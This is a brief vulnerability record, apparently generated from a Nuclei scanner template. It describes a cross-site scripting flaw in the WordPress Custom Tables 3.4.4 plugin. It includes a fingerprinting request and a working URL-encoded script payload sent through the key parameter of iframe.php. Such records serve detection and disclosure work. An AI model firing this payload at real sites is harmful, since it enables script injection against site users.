# Vulnerability: WordPress Custom Tables 3.4.4 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-custom-tables-xss.yaml`)

## Description
WordPress Custom Tables 3.4.4 plugin contains a cross-site scripting vulnerability via the key parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/custom-tables/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

